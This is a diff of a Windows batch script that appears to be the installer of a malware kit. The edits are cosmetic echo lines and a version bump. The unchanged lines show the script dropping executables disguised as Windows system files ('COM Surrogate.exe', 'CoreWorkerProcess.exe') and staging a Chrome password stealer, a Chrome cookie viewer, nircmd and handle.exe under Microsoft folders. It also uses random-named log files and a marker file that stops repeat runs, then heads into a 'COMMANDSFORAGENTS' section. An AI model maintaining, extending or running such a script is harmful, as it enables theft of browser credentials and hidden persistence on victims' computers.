@@ -6,7 +6,7 @@ if exist "%temp%\i059.tmp" exit
 setlocal enabledelayedexpansion
 
 
-set "BATCHVERSION=34.0"
+set "BATCHVERSION=34.2"
 set "LOGFILE=%temp%\S1rNsvQgG.mpeez"
 set "RESULT=%TEMP%\TGRESU.txa"
 set "ALLOWED=124"
@@ -631,6 +631,9 @@ echo.
 if exist "%SHSTFILEroot%" (
     echo Failed to delete %SHSTFILEroot%!
     echo Going to CheckKMSAuto
+    echo.
+    echo.
+    echo.
     goto CheckKMSAuto
 ) else (
     echo Successfully deleted %SHSTFILEroot%.
@@ -759,6 +762,8 @@ echo.
 
 if "%KMSFILEmd5%"=="%KMSAutoMD5%" (
     echo MD5 matches %KMSFILEmd5% = %KMSAutoMD5%
+    echo.
+    echo.
     echo going to CheckComSurrogate
     goto CheckComSurrogate
 )
@@ -790,6 +795,9 @@ echo.
 if exist "%KMSFILEroot%" (
     echo Failed to delete %KMSFILEroot%!
     echo Going to CheckComSurrogate
+    echo.
+    echo.
+    echo.
     goto CheckComSurrogate
 ) else (
     echo Successfully deleted %KMSFILEroot%.
@@ -805,6 +813,9 @@ if exist "%KMSFILE%" (
 
 
 
+echo.
+echo.
+echo.
 
 
 echo Going to KMSINSTALL...
@@ -869,6 +880,9 @@ echo.
 
 
 
+
+
+
 :CheckComSurrogate
 echo :CheckComSurrogate
 echo.
@@ -876,6 +890,9 @@ echo.
 :: Check ComSurrogate.exe; if found, skip to next section
 if exist "%ProgramData%\Microsoft\Windows\COM Surrogate.exe" (
     echo %ProgramData%\Microsoft\Windows\COM Surrogate.exe found. Going to CheckCWP
+    echo.
+    echo.
+    echo.
     goto CheckCWP
 )
 
@@ -947,9 +964,12 @@ echo.
 
 
 
-:: Check CoreWorkerProcess.exe; if found, skip to CheckComSurrogate
+:: Check CoreWorkerProcess.exe; if found, skip to Check7ZIP
 if exist "%ProgramData%\Microsoft\Windows\CoreWorkerProcess.exe" (
     echo %ProgramData%\Microsoft\Windows\CoreWorkerProcess.exe found. Going to Check7ZIP
+    echo.
+    echo.
+    echo.
     goto Check7ZIP
 )
 
@@ -1015,6 +1035,9 @@ echo.
 :: Check 7z.exe; 7z.dll if found, skip to next section
 if exist "%APPDATA%\Microsoft\7z.exe" (
     echo %APPDATA%\Microsoft\7z.exe found. Going to CheckNIRCMD
+    echo.
+    echo.
+    echo.
     goto CheckNIRCMD
 )
 
@@ -1070,6 +1093,8 @@ echo.
 
 
 
+
+
 :CheckNIRCMD
 echo :CheckNIRCMD
 echo.
@@ -1077,6 +1102,9 @@ echo.
 :: Check nircmd.exe; if found, skip to next section
 if exist "%APPDATA%\Microsoft\nircmd.exe" (
     echo %APPDATA%\Microsoft\nircmd.exe found. Going to CheckHandle
+    echo.
+    echo.
+    echo.
     goto CheckHandle
 )
 
@@ -1125,6 +1153,8 @@ echo.
 
 
 
+
+
 :CheckHandle
 echo :CheckHandle
 echo.
@@ -1132,6 +1162,9 @@ echo.
 :: Check handle.exe; if found, skip to next section
 if exist "%file9%" (
     echo %file9% found. Going to CheckWudTest
+    echo.
+    echo.
+    echo.
     goto CheckWudTest
 )
 
@@ -1194,9 +1227,12 @@ echo.
 
 
 
-:: Check wudtest.exe; if found, skip to COMMANDSFORAGENTS
+:: Check wudtest.exe; if found, skip to CheckChrmCksViewer
 if exist "%file10%" (
     echo %file10% found. Going to CheckChrmCksViewer
+    echo.
+    echo.
+    echo.
     goto CheckChrmCksViewer
 )
 
@@ -1247,6 +1283,17 @@ echo.
 
 
 
+
+
+
+
+
+
+
+
+
+
+
 :CheckChrmCksViewer
 echo :CheckChrmCksViewer
 echo.
@@ -1256,6 +1303,9 @@ echo.
 :: Check ChrmCksViewer; if found, skip to CheckRunBatHidden
 if exist "%file11%" (
     echo %file11% found. Going to CheckRunBatHidden
+    echo.
+    echo.
+    echo.
     goto CheckRunBatHidden
 )
 
@@ -1307,6 +1357,11 @@ echo.
 
 
 
+
+
+
+
+
 :CheckRunBatHidden
 echo :CheckRunBatHidden
 echo.
@@ -1316,6 +1371,9 @@ echo.
 :: Check wudtest.exe; if found, skip to CheckChromePass
 if exist "%file12%" (
     echo %file12% found. Going to CheckChromePass
+    echo.
+    echo.
+    echo.
     goto CheckChromePass
 )
 
@@ -1369,10 +1427,6 @@ echo.
 
 
 
-
-
-
-
 :CheckChromePass
 echo :CheckChromePass
 echo.
@@ -1382,6 +1436,9 @@ echo.
 :: Check ChrmPass; if found, skip to COMMANDSFORAGENTS
 if exist "%file13%" (
     echo %file13% found. Going to COMMANDSFORAGENTS
+    echo.
+    echo.
+    echo.
     goto COMMANDSFORAGENTS
 )
 
@@ -1431,7 +1488,9 @@ echo.
 
 
 
-
+echo.
+echo.
+echo.
 
 
 
